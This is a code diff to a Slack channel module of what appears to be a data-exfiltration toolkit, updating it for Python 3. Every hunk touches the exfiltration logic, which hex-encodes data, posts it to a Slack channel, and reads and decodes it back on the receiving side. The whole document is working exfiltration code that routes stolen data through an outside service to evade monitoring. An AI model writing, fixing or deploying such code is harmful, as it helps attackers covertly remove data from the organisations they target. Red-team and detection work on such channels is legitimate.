@@ -1,4 +1,4 @@
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 from slackbot.slackclient import SlackClient
 import time
 
@@ -11,7 +11,7 @@ def send(data):
     global sc
     chan = config['chan_id']
     app_exfiltrate.log_message('info', "[slack] Sending {} bytes with Slack".format(len(data)))
-    data = hexlify(data.encode())
+    data = hexlify(data.encode()).decode()
 
     sc.api_call("api.text")
     sc.api_call("chat.postMessage", as_user="true:", channel=chan, text=data)
@@ -25,8 +25,9 @@ def listen():
                 raw_data = sc.rtm_read()[0]
                 if 'text' in raw_data:
                     app_exfiltrate.log_message('info', "[slack] Receiving {} bytes with Slack".format(len(raw_data['text'])))
-                    app_exfiltrate.retrieve_data(raw_data['text'].decode('hex'))
-            except:
+                    app_exfiltrate.retrieve_data(unhexlify(raw_data['text']).decode())
+            except Exception as e:
+                print(e)
                 pass
             time.sleep(1)
     else:
